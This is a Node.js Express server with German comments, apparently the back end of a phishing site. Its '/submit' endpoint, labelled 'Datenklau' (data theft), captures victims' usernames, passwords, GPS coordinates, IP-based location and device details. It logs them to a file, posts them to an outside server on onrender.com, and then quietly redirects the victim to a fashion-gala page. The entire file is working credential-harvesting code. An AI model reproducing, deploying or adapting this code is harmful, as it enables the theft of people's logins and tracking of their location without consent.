const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');
const geoip = require('geoip-lite'); // Für IP-Geolocation
const device = require('express-device'); // Für Device-Tracking

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware für erweitertes Tracking
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(device.capture()); // Device-Typ (Mobile/Desktop) erkennen

// Erweiterte Log-Datei mit mehr Metadaten
const logSubmission = (data) => {
  const logEntry = {
    timestamp: new Date().toISOString(),
    ip: data.ip,
    userAgent: data.userAgent,
    deviceType: data.deviceType,
    browser: data.browser,
    os: data.os,
    username: data.username,
    password: data.password,
    latitude: data.latitude,
    longitude: data.longitude,
    city: data.city,
    country: data.country
  };
  fs.appendFileSync('submissions.log', JSON.stringify(logEntry) + '\n');
};

// Standort-API (falls JavaScript-Geolocation blockiert)
const getIPLocation = (ip) => {
  const geo = geoip.lookup(ip);
  return geo ? { city: geo.city, country: geo.country } : null;
};

// POST-Endpoint für Datenklau
app.post('/submit', async (req, res) => {
  try {
    const { username, password, latitude, longitude } = req.body;
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ipLocation = getIPLocation(clientIp);

    const logData = {
      ip: clientIp,
      userAgent: req.headers['user-agent'],
      deviceType: req.device.type, // Mobile/Desktop
      browser: req.useragent.browser,
      os: req.useragent.os,
      username,
      password,
      latitude,
      longitude,
      city: ipLocation?.city || "Unbekannt",
      country: ipLocation?.country || "Unbekannt"
    };

    logSubmission(logData); // Lokal speichern

    // Optional: Daten an externen Server senden
    await fetch('https://loropiana1.onrender.com/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(logData)
    });

    // Unauffällige Weiterleitung
    res.redirect('/fashion-gala.html');

  } catch (error) {
    console.error("❌ Fehler:", error);
    res.status(500).send("Serverfehler");
  }
});

// Starte den Server
app.listen(PORT, () => {
  console.log(`✅ Server läuft auf http://localhost:${PORT}`);
});
